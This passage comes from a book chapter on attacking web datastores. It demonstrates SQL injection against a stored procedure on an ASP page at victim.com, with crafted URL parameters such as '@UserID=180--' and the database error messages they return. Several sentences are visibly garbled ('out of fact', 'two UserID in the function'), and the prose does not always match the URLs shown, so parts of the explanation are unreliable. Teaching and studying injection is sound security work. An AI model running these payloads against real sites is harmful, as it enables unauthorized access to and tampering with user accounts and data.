# Chapter 8: Attacking Web Datastores

Microsoft VBScript runtime (0x800A000D).
Type mismatch: '[string: "12,@UserID=180--"]
/SiteAdmin.asp, line 114

As you can see, we're out of ODBC error territory and into the realm of VBScript. Our
SQL injection has been relegated to a minor input validation error. However, we're not
out of tricks yet. What happens if we throw a spike (+) to the mix?

http://www.victim.com/SiteAdmin.asp?SiteID=11,@UserID

Microsoft OLE DB for ODBC Drivers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQLServer] declare the variable '@UserID'

Interesting. We managed to generate an ODBC error out of fact, with the @UserID
variable has not been declared. This drives the point of how difficult it is to break a
stored procedure. The SiteID variable could be pasted into the SiteID portion of the state-
ment. No more, no less.

Of course, this might have been a mistake. What if we hadn't bothered to include
the SQL comment the first time around?

http://www.victim.com/SiteAdmin.asp?SiteID=12,@UserID

Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQLServer]Procedure or function
getAdminHome has too many arguments specified.
/SiteAdmin.asp, line 7

It looks like we are right all along. We can change our UserID. Unfortunately, we
are now two UserID in the function—one more of academic interest, consider a different method of submitting
multiple parameters:

http://www.victim.com/SiteAdmin.asp?SiteID=12&SiteID=12

Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQLServer]Must pass parameter
number 2 and subsequent parameters as '@name = value'. After the form
'@name' has been used, all subsequent parameters must be passed
in the form '@name = value'.
/SiteAdmin.asp, line 7

ASP receives the SiteID argument as "SiteID=12, 12". The stored procedure proceeds as this:

@name = 12, 12